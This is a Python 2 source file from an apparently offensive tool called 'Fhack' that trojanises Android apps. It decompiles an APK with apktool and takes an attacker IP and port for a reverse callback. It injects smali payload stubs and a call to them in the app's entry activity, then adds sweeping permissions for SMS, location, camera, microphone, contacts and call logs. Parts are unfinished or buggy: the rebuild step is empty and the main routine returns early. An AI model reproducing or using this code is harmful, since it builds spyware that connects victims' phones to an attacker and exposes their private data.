try:
    import src.libs as lib
    import sys, os
    from src.Colors import TextColor
    import subprocess as subproc
    from time import sleep
except Exception as error:
    raise SystemExit, '\033[31m' + '%s' % error + "\033[0m"

decomOutPutPath = os.getcwd() + "/outputs/Malwares/"

define_ENDPOINTIP = ""
define_ENDPOINTPORT = ""
define_IncomPalm = ""
define_httpsCOM = ""
define_hexEndPoint = ""


def Decompile():
    command = ['apktool', '--version']
    # Check that apktool is install in system
    process = subproc.Popen(command, stdout=subproc.PIPE, stderr=subproc.PIPE)
    apktoolVersion, error = process.communicate()

    if "2." not in apktoolVersion:
        raise SystemExit, TextColor.RED + "[-] You do not have  << apktool >> please install it from setup.py" + \
                          TextColor.WHITE
    else:

        define_ENDPOINTIP = raw_input(TextColor.CVIOLET + '~/Fhack/# Enter your RHOST(Your IP): ' + TextColor.WHITE)

        define_ENDPOINTPORT = int(
            raw_input(TextColor.CVIOLET + "~/Fhack/# Enter your RPORT(Your PORT): " + TextColor.WHITE))

        if define_ENDPOINTPORT > 65535:
            raise SystemExit, TextColor.RED + "We have not port bigger than 65535 ... !" + TextColor.WHITE

        apkPath = raw_input(TextColor.CVIOLET + "~/Fhack/# Enter apk(application) full path: " + TextColor.WHITE)

        if os.path.exists(apkPath):

            print TextColor.WARNING + "---------- Starting the process ----------"
            sleep(1)
            print TextColor.CYAN + "[+] Endpoint Ip set as: %s" % define_ENDPOINTIP + TextColor.WHITE
            sleep(.5)
            print TextColor.CYAN + "[+] Endpoint Port set as: %s" % define_ENDPOINTPORT + TextColor.WHITE
            sleep(.5)
            print TextColor.WARNING + "[+] Decompiling TARGET ..." + TextColor.WHITE
            print TextColor.WHITESMOKE + "[*] Please wait to complete this step"

            # Decompiling application with apk tool
            outPutApkDirectory = (apkPath.split('/')[-1]).split('.')[0]
            command = ["apktool", "d", "-f", apkPath,
                       '-o', decomOutPutPath + "CreateMalware/Android/" + outPutApkDirectory]
            process = subproc.Popen(command, stdout=subproc.PIPE, stderr=subproc.PIPE)
            result = process.communicate()[0]  # end decompiling

            if "error" in result:
                raise SystemExit, TextColor.RED + "[-] APKTool have error on decompiling: %s" % result + TextColor.WHITE
                print
            else:
                print TextColor.GREEN + "[+] APKTool Decompile was success"
                return decomOutPutPath + "CreateMalware/Android/" + outPutApkDirectory
        else:
            print TextColor.RED + "\n[-] Path does not exist\n"


def ByteReadyHttpsCOMM():
    print TextColor.WHITESMOKE + "[*] Byting in https comms" + TextColor.WHITE

    global define_httpsCOM
    define_httpsCOM = 1
    endPoint = "ZZZZhttps://" + endpointIP + ":" + endpointPort + \
               "/qFTHTkSl1FhadlllA0gBcg882wlHLDmhMn6j1_ykMcArMkXkE-KOQ3RV-W7JtI5nf7x65a3fwcw" \
               "gLEPvnCgmeb2f0m-VVEm_qAMZzFhGdNn8F46OtF_FJAP1b1AjG5x8X-GGH-rekgabzOzEMkQkgqYuUl"
    endpointLength = len(endPoint)

    global define_IncomPalm
    define_IncomPalm = hex(endpointLength)

    global define_hexEndPoint
    for val in endPoint:
        define_hexEndPoint += hex(ord(val)) + "\n\t\t"


def ByteReadyTCPCOMM():
    print TextColor.WHITESMOKE + "[+] Byting in tcp comms" + TextColor.WHITE

    endPoint = "ZZZZtcp://" + define_ENDPOINTIP + ":" + str(define_ENDPOINTPORT)
    endpointLength = len(endPoint)

    global define_IncomPalm
    global define_httpsCOM
    global define_hexEndPoint

    define_httpsCOM = 0

    define_IncomPalm = hex(endpointLength)

    for val in endPoint:
        define_hexEndPoint += hex(ord(val)) + "\n\t\t"


def ParseAndManifest(decompilePath):
    print TextColor.WHITESMOKE + "[*] Looking for android manifest file" + TextColor.WHITE

    listOfManifests = list()

    # searching for manifests file
    for (dirpath, dirnames, filenames) in os.walk(decompilePath):
        for filename in filenames:
            if filename.find('AndroidManifest.xml') is not -1:
                listOfManifests.append(dirpath + "/" + filename)
    # done

    sleep(1)
    print TextColor.GREEN + "[+] Android manifest file Found" + TextColor.WHITE

    list_activities = set()
    for item in listOfManifests:
        with open(item, 'r') as file:
            for line in file.readlines():
                if line.strip('\n').find("<activity") is not -1:
                    list_activities.add(line.strip('\n').strip(' '))
                else:
                    continue

    print TextColor.WHITESMOKE + "[*] Looking for activities that apk has" + TextColor.WHITE
    # searching for all activites that android app use

    mainActivity = ""
    listOfActivities = set()

    for item in list_activities:
        if item.startswith("<activity-alias"):
            # androidname = item[item.find('android:name='):]
            androidtargetActivity = item[item.find('android:targetActivity'):]
            #
            # listOfActivities.add(androidname.split('android:name=')[1].split("\"")[1])
            mainActivity = androidtargetActivity.split('android:targetActivity=')[1].split("\"")[1]
        else:
            activity = item[item.find('android:name='):]
            listOfActivities.add(str(activity.split('android:name=')[1].split('\"')[1]))

    counter = 0
    make_table = lib.mytable(['Count', 'Name', "Root"])
    for item in listOfActivities:
        if counter == 0:
            make_table.add_row([str(counter), mainActivity, "yes"])
        else:
            make_table.add_row([str(counter), item, "no"])
        counter += 1
    print TextColor.CYELLOW + str(make_table) + TextColor.WHITE + "\n"

    selected = int(raw_input(TextColor.CVIOLET + '~ Fhack/# Which activity that you wanna inject code: '
                             + TextColor.WHITE))

    if selected == 0:
        return mainActivity
    else:
        try:
            return listOfActivities[selected]
        except IndexError as error:
            raise SystemExit, "%s => Please item in above list" % error
        except Exception as error:
            raise SystemExit, "%s" % error


def PayloadRepairing(targetActivity, targetDecompiledDir):
    print TextColor.WARNING + "[*] Present the payloads for injection" + TextColor.WHITE

    payloadsBaseDir = os.getcwd() + "/CreateMalware/android/codeinjection/payloads"

    if define_httpsCOM == 1:
        payloadPathHTTPS_1 = payloadsBaseDir + "/HttpsActivity1.smali"
        payloadPathHTTPS_2 = payloadsBaseDir + "/HttpsActivity.smali"
        payloadPathHTTPS_3 = payloadsBaseDir + "/PayloadTrustManager.smali"

        contentsOfPayloadFile1 = open(payloadPathHTTPS_1).read()
        contentsOfPayloadFile2 = open(payloadPathHTTPS_2).read()
        contentsOfPayloadFile3 = open(payloadPathHTTPS_3).read()

        inject_Activity = "L" + targetActivity.replace('.', '/')
        intPackagePosition = inject_Activity.rfind('/')

        mode = inject_Activity[:intPackagePosition]
        packageNewName = mode.replace('/', '.').replace('L', '')
        finalPackageNewName = packageNewName + ".PayloadTrustManager"

        preppedContents1 = contentsOfPayloadFile1.replace('PLACEHOLDER', inject_Activity[:intPackagePosition])
        preppedContents2 = contentsOfPayloadFile2.replace('PLACEHOLDER', inject_Activity[:intPackagePosition]).replace(
            'OILYOLO',
            finalPackageNewName)
        preppedContents3 = contentsOfPayloadFile3.replace('PLACEHOLDER', inject_Activity[:intPackagePosition])

        # inject the tcp endpoint here
        preppedContents2 = preppedContents2.replace('IP_ADDR', define_ENDPOINTIP)
        preppedContents2 = preppedContents2.replace('END_PORT', define_ENDPOINTPORT)

        targetDirectory = targetDecompiledDir + "/smali/" + targetActivity.replace('.', '/')
        targetDirectory = targetDirectory[:targetDirectory.rfind('/')]

        assist1File = open(targetDirectory + "/HttpsActivity1.smali", "w")
        assist1File.write(preppedContents1)
        assist1File.close()

        assist2File = open(targetDirectory + "/HttpsActivity.smali", "w")
        assist2File.write(preppedContents2)
        assist2File.close()

        assist3File = open(targetDirectory + "/PayloadTrustManager.smali", "w")
        assist3File.write(preppedContents3)
        assist3File.close()

        pathToFile = targetFolder + "/smali/" + activityToTarget.replace('.', '/') + '.smali'
        stringContentsOfTargetActivity = open(pathToFile).read()
    else:
        payloadPathTCP_1 = payloadsBaseDir + "/AssistActivity1.smali"
        payloadPathTCP_2 = payloadsBaseDir + "/AssistActivity.smali"

        payloadConentTCP_1 = open(payloadPathTCP_1, 'r').read()
        payloadConentTCP_2 = open(payloadPathTCP_2, 'r').read()

        inject_Activity = "L" + targetActivity.replace('.', '/')
        intPackagePosition = inject_Activity.rfind('/')
        preppedContents1 = payloadConentTCP_1.replace('PLACEHOLDER', inject_Activity[:intPackagePosition])
        preppedContents2 = payloadConentTCP_2.replace('PLACEHOLDER', inject_Activity[:intPackagePosition])

        # now inject tcp port and ip to this contents
        preppedContents2 = preppedContents2.replace('FACEPALM', define_IncomPalm)
        preppedContents2 = preppedContents2.replace("BEARDEDGREATNESS", define_hexEndPoint)

        targetDir = targetDecompiledDir + "/smali/" + targetActivity.replace('.', '/')
        targetDir = targetDir[:targetDir.rfind('/')]

        # creating local file in application for code injection
        assist1File = open(targetDir + "/AssistActivity1.smali", "w")
        assist1File.write(preppedContents1)
        assist1File.close()

        assist2File = open(targetDir + "/AssistActivity.smali", "w")
        assist2File.write(preppedContents2)
        assist2File.close()
        # done

        pathToFile = targetDecompiledDir + "/smali/" + targetActivity.replace('.', '/') + '.smali'
        stringContentsOfTargetActivity = open(pathToFile).read()

    print TextColor.GREEN + "[+] All file created successfully" + TextColor.WHITE


def InjectBadCodeToActivity(targetActivity, targetDecompiledDir):
    print TextColor.WARNING + "[*] Inject bad code to apk please wait !!!" + TextColor.WHITE

    checkStrings = ['create', 'method']
    stringInvokePayload = ""

    pathToFile = targetDecompiledDir + "/smali/" + targetActivity.replace('.', '/') + '.smali'
    if define_httpsCOM == 1:
        stringInvokePayload = '\ninvoke-static {p0}, INJECT/HttpsActivity;->start(Landroid/content/Context;)V\n'
    else:
        stringInvokePayload = '\ninvoke-static {p0}, INJECT/AssistActivity;->doThis(Landroid/content/Context;)V\n'

    # NOW WE NEED TO INJECT THE CALLING CODE INTO THE TARGET ACTIVITY
    inject = "L" + targetActivity.replace('.', '/')
    intPackagePos = inject.rfind('/')
    stringPackageToInject = inject[:intPackagePos]
    stringInvokePayload = stringInvokePayload.replace('INJECT', stringPackageToInject)

    f = open(pathToFile, 'r')
    stringDataToWriteIntoNewActivity = ""
    for line in f.readlines():
        stringDataToWriteIntoNewActivity += line
        if all(x in line.lower() for x in checkStrings):
            stringDataToWriteIntoNewActivity += stringInvokePayload
            f.close()

    with open(pathToFile, "w") as file:
        file.write(stringDataToWriteIntoNewActivity)

    print TextColor.GREEN + "[+] Inject bad code to apk was successfully" + TextColor.WHITE


def InjectBadPermissionsToXML(targetFolder):
    print TextColor.WARNING + "[*] Injection bad permission please wait !!!" + TextColor.WHITE

    stringCrazyPermissions = '\n<uses-permission android:name="android.permission.INTERNET" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.ACCESS_COURSE_LOCATION" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.READ_PHONE_STATE" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.SEND_SMS" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.RECEIVE_SMS"/>'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.RECORD_AUDIO" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.CALL_PHONE" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.READ_CONTACTS" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.WRITE_CONTACTS" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.RECORD_AUDIO" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.WRITE_SETTINGS" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.CAMERA" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.READ_SMS" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.READ_CALL_LOG" />"\n'

    checkString = "<uses-permission android:name="
    pathToFile = targetFolder + "/AndroidManifest.xml"
    # NOW WE NEED TO INJECT THE ADDITIONAL PERMISSIONS INTO THE TARGET MANIFEST
    firstCheck = 0
    f = open(pathToFile, 'r')
    stringDataToWriteIntoNewActivity = ""
    for line in f.readlines():
        stringDataToWriteIntoNewActivity += line
        if checkString.lower() in line.lower():
            if firstCheck == 0:
                stringDataToWriteIntoNewActivity += stringCrazyPermissions
                firstCheck = 1
    f.close()
    newInjectFile = open(pathToFile, "w")
    newInjectFile.write(stringDataToWriteIntoNewActivity)
    newInjectFile.close()

    print TextColor.WARNING + "[*] Injection bad permission was successfully !!!" + TextColor.WHITE


def BuildApkAgain(targetFolder):

    pass



def InjectCode():
    print 'comming soon please wait'
    return

    global define_ENDPOINTPORT, define_ENDPOINTIP

    if not os.path.exists(decomOutPutPath):
        os.mkdir(decomOutPutPath)

    decompileDir = Decompile()  # first we decompile the target apk

    # now we must ready comms to connect apk to one of them
    try:
        if "https" in define_ENDPOINTIP:
            ByteReadyHttpsCOMM()
        else:
            ByteReadyTCPCOMM()
    except Exception as error:
        raise SystemExit, TextColor.RED + "%s" % error + TextColor.WHITE

    # now we must pase android manifest of application then inject code to it
    try:
        selectedActivity = ParseAndManifest(decompileDir)
    except Exception as error:
        raise SystemExit, TextColor.RED + 'We have error on parsing android manifest as: %s' % error + TextColor.WHITE

    # path that attacker wanna inject code
    targetSmaliPathFromLocal = decompileDir + "/smali/" + selectedActivity.replace('.', '/') + ".smali"
    targetActivity = selectedActivity

    try:
        PayloadRepairing(targetActivity, decompileDir)
    except Exception as error:
        raise SystemExit, TextColor.RED + "Have problem on Reparing the payloads: %s" % error + TextColor.WHITE

    # now time to inject bad codes to target activity

    try:
        InjectBadCodeToActivity(targetActivity, decompileDir)
    except Exception as error:
        raise SystemExit, TextColor.RED + "Have problem on bad code injection in target activity : %s" % error + TextColor.WHITE

    # for getting all access of application we must inject all permission that exist in android :)
    try:
        InjectBadPermissionsToXML(decompileDir)
    except Exception as error:
        raise SystemExit, TextColor.RED + "Have problem on bad permission injection in target activity : %s" % error + TextColor.WHITE

    # try:
    BuildApkAgain(decompileDir)
    # except Exception as error:
    #     raise SystemExit, TextColor.RED + "Have problem on build new application: %s" % error + TextColor.WHITE


if __name__ == "__main__":
    InjectCode()
